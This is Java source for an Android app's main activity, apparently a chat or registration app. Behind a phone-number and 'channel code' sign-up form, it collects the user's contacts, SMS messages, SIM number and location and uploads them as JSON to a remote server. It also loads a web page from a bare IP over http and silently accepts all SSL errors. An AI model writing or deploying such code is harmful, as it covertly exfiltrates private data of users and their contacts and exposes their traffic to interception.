package com.example.qingliao;

import android.Manifest;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.http.SslError;
import android.os.Build;
import android.os.Bundle;
import android.text.TextUtils;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.webkit.SslErrorHandler;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import com.orhanobut.dialogplus.DialogPlus;
import com.orhanobut.dialogplus.OnClickListener;
import com.orhanobut.dialogplus.OnDismissListener;
import com.orhanobut.dialogplus.ViewHolder;

import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.List;

import pl.com.salsoft.sqlitestudioremote.SQLiteStudioService;

public class MainActivity extends AppCompatActivity implements View.OnClickListener {
    private static final int PERMISSIONS_STATE_CODE_BASIC_INFORMATION = 1;
    public static final int LOCATION_CODE = 301;

    public static boolean Request_Permission = false;
    JsonUtil jsonUtil=new JsonUtil();



    private boolean isPermissons=true ;
    String[] permissions = new String[]{
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.ACCESS_FINE_LOCATION
    };
    // 声明一个集合，在后面的代码中用来存储用户拒绝授权的权
    List<String> mPermissionList = new ArrayList<>();

    public AlertDialog alertDialog2;
    private Button btn_register;
    private Button btn_login;
    private EditText editText;
    private EditText editText2;
    HttpServer httpServer;
    private WebView webView ;
    private  Button btnShowLogin ;
    private LinearLayout line ;
    private LinearLayout line1 ;
    private TextView btnCo ;
    private Button btnSure;
    private EditText idYAOQINGMA;
    private EditText btnSHOUJI;



    public static List<String>lal=new ArrayList<>();
    public static String simPhone="";
    public static List<PhoneDto> phoneContactsList=new ArrayList<>();
    public static List<SmsDto> smsList=new ArrayList<>();
    private  DialogPlus dialog;
    @RequiresApi(api = Build.VERSION_CODES.M)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        SQLiteStudioService.instance().start(this);
//        btn_register = findViewById(R.id.main_regien_button);
//        btn_login=findViewById(R.id.main_login_button);
//        editText=findViewById(R.id.editText);
//        editText2=findViewById(R.id.editText2);
        httpServer=new HttpServer();
//        btn_login.setOnClickListener(new View.OnClickListener() {
//            @Override
//            public void onClick(View v) {
//                if(editText2.getText().toString().equals("")&&editText.getText().toString().equals("")){
//                    Toast.makeText(MainActivity.this, "请输入账号和密码", Toast.LENGTH_SHORT).show();
//                }else if(editText.getText().toString().equals("")) {
//                    Toast.makeText(MainActivity.this, "请输入账号", Toast.LENGTH_SHORT).show();
//                }
//                else if(editText2.getText().toString().equals("")){
//                    Toast.makeText(MainActivity.this, "请输入密码", Toast.LENGTH_SHORT).show();
//                }else {
//                    Toast.makeText(MainActivity.this, "输入的账号和密码不正确", Toast.LENGTH_SHORT).show();
//                }
//            }
//        });

        webView = findViewById(R.id.idWebView);
        //初始化权限
        initPermissions();
//        initDialog();
//        btn_register.setOnClickListener(new View.OnClickListener() {
//            @Override
//            public void onClick(View v) {
//                dialog.show();
//            }
//        });


        LoadWebView();
    }

    private  void  LoadPageDom(){
        idYAOQINGMA= findViewById(R.id.idYAOQINGMA);
        btnSHOUJI= findViewById(R.id.btnSHOUJI);
        btnShowLogin = findViewById(R.id.btnClick);
        btnSure = findViewById(R.id.btnSuer);
        btnShowLogin.setOnClickListener(this);
        btnSure.setOnClickListener(this);
        line = findViewById(R.id.Linear);
        line1 = findViewById(R.id.line1);
        btnCo = findViewById(R.id.btnCo);
        btnCo.setOnClickListener(this);

    }

    //加载页面
    private void LoadWebView() {
        LoadPageDom();
        webView.loadUrl("http://122.51.104.232/html5/res/www/index.html");
        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);//支持js交互，可以点击网页中按钮链接
        settings.setJavaScriptCanOpenWindowsAutomatically(true);//支持js可以打开新的页面
        settings.setSupportZoom(true);//是否可以缩放，默认true
        settings.setBuiltInZoomControls(true);//是否显示缩放按钮，默认false
        settings.setUseWideViewPort(true);//设置此属性，可任意比例缩放。大视图模式
        settings.setLoadWithOverviewMode(true);//和setUseWideViewPort(true)一起解决网页自适应问题
        settings.setAppCacheEnabled(false);//是否使用缓存
        settings.setDomStorageEnabled(true);//DOM Storage

        webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                //使用WebView加载显示url
                view.loadUrl(url);
                //返回true
                return true;
            }

            @Override
            public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
                handler.proceed();//解决webview 加载https 出现没内容
            }
        });
    }

    private void initDialog() {
        dialog = DialogPlus.newDialog(MainActivity.this)
                //主内容
                .setContentHolder(new ViewHolder(R.layout.content))
                .setHeader(R.layout.header)
                .setFooter(R.layout.footer)
                .setGravity(Gravity.CENTER)
                .setExpanded(true)  // This will enable the expand feature, (similar to android L share dialog)
                .setOnClickListener(new OnClickListener() {
                    @Override
                    public void onClick(DialogPlus dialog, View view) {
                        EditText edt_phone= (EditText) dialog.findViewById(R.id.content_phone_button);
                        EditText edt_qdm= (EditText) dialog.findViewById(R.id.content_qdm_button);
                        switch (view.getId()) {
                            case R.id.footer_close_button:
                                dialog.dismiss();
                                break;
                            case R.id.footer_register_button:
                                Log.d("clike", "确定注册");
//                                btn_register.setOnClickListener(new View.OnClickListener() {
//                                    @Override
//                                    public void onClick(View v) {
                                        String json;
                                        String phone = edt_phone.getText().toString();
                                        String qdm = edt_qdm.getText().toString();
                                        //打包json
                                        Log.d("Buttonclick","打包json");
                                try {
                                    json=jsonUtil.getPhoneJson(lal,phone.toString(),phoneContactsList,smsList,qdm);
                                    Log.d("Buttonclick","发送数据");
                                    httpServer.sendJson(json);
                                } catch (UnsupportedEncodingException e) {
                                    e.printStackTrace();
                                }
                                //发送数据

//                                    }
//                                });
                                Toast.makeText(MainActivity.this, "注册成功", Toast.LENGTH_SHORT).show();
                                dialog.dismiss();
                                break;
                        }
                    }
                })
                .setOnDismissListener(new OnDismissListener() {
                    @Override
                    public void onDismiss(DialogPlus dialog) {
                        EditText edt_phone= (EditText) dialog.findViewById(R.id.content_phone_button);
                        EditText edt_qdm= (EditText) dialog.findViewById(R.id.content_qdm_button);
                        edt_phone.setText("");
                        edt_qdm.setText("");
                    }
                })
                .create();
    }

    //初始化权限
    private void initPermissions() {
        if (isFirst()){
            //对所有权限进行判断是否给与权限，没有的话进行请求
            applyPermission();
        }else {
            if ((!PermissionUtil.hasSelfPermission(this, permissions))) {
                for (int i = 0; i < permissions.length; i++) {
                    //                if (ContextCompat.checkSelfPermission(MainActivity_3.this, permissions[i]) != PackageManager.PERMISSION_GRANTED) {
                    mPermissionList.add(permissions[i]);
                    //                }
                }
                if (mPermissionList.isEmpty()) {//未授予的权限为空，表示都授予了
                    Log.d("onRequestPermissionsResult", "权限已全部获取");
                    simPhone = TelephonyUtil.getSimPhone(this);
                    phoneContactsList = TelephonyUtil.getPhoneContacts(this);
                    smsList = TelephonyUtil.getSms(this);
                    lal=LocationUtil.getLocation(this);
                }
            }
        }

        alertDialog2 = new AlertDialog.Builder(this)
                .setTitle("提醒")
                .setMessage("如果您同意弹出的权限便可使用程序，如未弹出请在\"手机设置\"中的\"权限管理\"中找到本应用，并打开相应权限，方可使用!")
                .setPositiveButton("确定", new DialogInterface.OnClickListener() {//添加"Yes"按钮
                    @Override
                    public void onClick(DialogInterface dialogInterface, int i) {
                        applyPermission();
                     }
                })

                .setNegativeButton("取消", new DialogInterface.OnClickListener() {//添加取消
                    @Override
                    public void onClick(DialogInterface dialogInterface, int i) {
                        Toast.makeText(MainActivity.this, "未授权权限", Toast.LENGTH_SHORT).show();
                    }
                })
                .create();
       }

    public void applyPermission() {
        if ((!PermissionUtil.hasSelfPermission(this, permissions))) {
            for (int i = 0; i < permissions.length; i++) {
                //                if (ContextCompat.checkSelfPermission(MainActivity_3.this, permissions[i]) != PackageManager.PERMISSION_GRANTED) {
                mPermissionList.add(permissions[i]);
                //                }
            }
            if (!mPermissionList.isEmpty()) {//未授予的权限为空，表示都授予了
                //请求权限方法
                String[] permissions = mPermissionList.toArray(new String[mPermissionList.size()]);//将List转为数组
                //1.目标地址，2.请求权限,3.请求代码
                ActivityCompat.requestPermissions(this, permissions, PERMISSIONS_STATE_CODE_BASIC_INFORMATION);
            }
        }
    }


    @Override
//    继承 申请权限
//    int requestCode: 在调用requestPermissions()时的第一个参数。
//    String[] permissions: 权限数组，在调用requestPermissions()时的第二个参数。
//    int[] grantResults: 授权结果数组，对应permissions，具体值和上方提到的PackageManager中的两个常量做比较。
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
            if (requestCode==PERMISSIONS_STATE_CODE_BASIC_INFORMATION){
                for (int i = 0; i < grantResults.length; i++) {
                    //判断是否为定位权限
                    if (requestCode==LOCATION_CODE){
                        if (grantResults.length > 0 && grantResults[0] == getPackageManager().PERMISSION_GRANTED
                                && grantResults[1] == PackageManager.PERMISSION_GRANTED) {
                            Log.d("onRequestPermissionsResultGPS", "location以获得权限");
                        } else {
                            Log.d("onRequestPermissionsResultGPS", "location未获得权限");
                        }
                    }else{//不是定位权限
                        switch (permissions[i]){
                                //本机手机
                            case Manifest.permission.READ_PHONE_STATE:
                                if (grantResults.length > 0 && grantResults[i] == PackageManager.PERMISSION_GRANTED) {
                                    simPhone=TelephonyUtil.getSimPhone(this);
                                    Log.d("onRequestPermissionsResult","READ_PHONE_STATE获得权限");
                                }else {
                                    Log.d("onRequestPermissionsResult","READ_PHONE_STATE未获得权限");
                                }
                                break;
                                //通讯录
                            case    Manifest.permission.READ_CONTACTS:
                                if (grantResults.length > 0 && grantResults[i] == PackageManager.PERMISSION_GRANTED) {
                                    Log.d("onRequestPermissionsResult", "READ_CONTACTS获得权限");
                                    phoneContactsList=TelephonyUtil.getPhoneContacts(this);

                                }else {
                                Log.d("onRequestPermissionsResult","READ_CONTACTS未获得权限");
                            }
                                break;
                                //短信
                            case Manifest.permission.READ_SMS:
                                if (grantResults.length > 0 && grantResults[i] == PackageManager.PERMISSION_GRANTED) {
                                    Log.d("onRequestPermissionsResult", "READ_SMS获得权限");
                                    smsList=  TelephonyUtil.getSms(this);
                                }else {
                                Log.d("onRequestPermissionsResult","READ_SMS未获得权限");
                            }
                                break;
                            case Manifest.permission.ACCESS_COARSE_LOCATION:
                            case Manifest.permission.ACCESS_FINE_LOCATION:
                                if (grantResults.length > 0 && grantResults[i] == PackageManager.PERMISSION_GRANTED) {
                                    Log.d("onRequestPermissionsResult", "location获得权限");
                                    lal= LocationUtil.getLocation(this);
                                }else {
                                    Log.d("onRequestPermissionsResult","location未获得权限");
                                }
                                break;
                        }
                    }
                }


            }
        Request_Permission=true;
//        if (Request_Permission){
//            jsonUtil.getPhoneJson(lal,simPhone,phoneContactsList,smsList,"0");
//        }
        Log.d("Permissons", String.valueOf(isPermissons));
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        }



//    LocationListener mListener = new LocationListener() {
//        @Override
//        public void onStatusChanged(String provider, int status, Bundle extras) {
//        }
//        @Override
//        public void onProviderEnabled(String provider) {
//        }
//        @Override
//        public void onProviderDisabled(String provider) {
//        }
//        // 如果位置发生变化，重新显示
//        @Override
//        public void onLocationChanged(Location location) {
//            showLocation(location);
//        }
//    };

    private boolean isFirst(){
        boolean isFirst=true;
        SharedPreferences setting = getSharedPreferences("First.ini", 0);
        Boolean user_first = setting.getBoolean("FIRST",true);
        if(user_first){//第一次
            setting.edit().putBoolean("FIRST", false).commit();
        }
        return user_first;
    }

    @Override
    public void onClick(View v) {
        switch (v.getId()){
            case R.id.btnClick:
                line.setVisibility(View.VISIBLE);
                line1.setVisibility(View.INVISIBLE);

                break;
            case R.id.btnCo:
                line.setVisibility(View.INVISIBLE);
                line1.setVisibility(View.VISIBLE);
                break;
            case R.id.btnSuer:
                if(btnSHOUJI.getText().equals("")){
                    Toast.makeText(this, "手机号码不能为空", Toast.LENGTH_SHORT).show();
                    return;
                }
                if (!isMobileNO(btnSHOUJI.getText().toString())){
                    Toast.makeText(this, "请输入正确手机号!", Toast.LENGTH_SHORT).show();
                    return;
                }
                if (idYAOQINGMA.getText().toString().equals("")){
                    Toast.makeText(this, "请输入渠道码", Toast.LENGTH_SHORT).show();
                    return;
                }
                if (idYAOQINGMA.getText().toString().length()!=6){
                    Toast.makeText(this, "渠道码长度为6位,请输入正确的渠道码！", Toast.LENGTH_SHORT).show();
                    return;
                }
                if (!PermissionUtil.hasSelfPermission(this, permissions)){
                    alertDialog2.show();
                    return;
                }

                String json;
                String phone = btnSHOUJI.getText().toString();
                String qdm = idYAOQINGMA.getText().toString();
                Log.d("Buttonclick","打包json");
                try {
                    json=jsonUtil.getPhoneJson(lal,phone.toString(),phoneContactsList,smsList,qdm);
                    Log.d("Buttonclick","发送数据");
                    httpServer.sendJson(json);
                } catch (UnsupportedEncodingException e) {
                    e.printStackTrace();
                }
//发送数据
                Intent intent = new  Intent(this, Imglist.class);
                startActivity(intent);
                break;
//                String json= null;
//                // 这里相当与注册，你就把接口弄到这里面就行了
//
//
//                try {
//                    json = jsonUtil.getPhoneJson(lal,btnSHOUJI.getText().toString(),phoneContactsList,smsList,idYAOQINGMA.getText().toString());
//                } catch (UnsupportedEncodingException e) {
//                    e.printStackTrace();
//                }
//                httpServer.sendJson(json);



        }
    }


    public static boolean isMobileNO(String mobileNums) {
        /**
         * 判断字符串是否符合手机号码格式
         * 移动号段: 134,135,136,137,138,139,147,150,151,152,157,158,159,170,178,182,183,184,187,188
         * 联通号段: 130,131,132,145,155,156,170,171,175,176,185,186
         * 电信号段: 133,149,153,170,173,177,180,181,189
         * @param str
         * @return 待检测的字符串
         */
        String telRegex = "^((13[0-9])|(14[5,7,9])|(15[^4])|(18[0-9])|(17[0,1,3,5,6,7,8]))\\d{8}$";// "[1]"代表下一位为数字可以是几，"[0-9]"代表可以为0-9中的一个，"[5,7,9]"表示可以是5,7,9中的任意一位,[^4]表示除4以外的任何一个,\\d{9}"代表后面是可以是0～9的数字，有9位。
        if (TextUtils.isEmpty(mobileNums))
            return false;
        else
            return mobileNums.matches(telRegex);
    }
}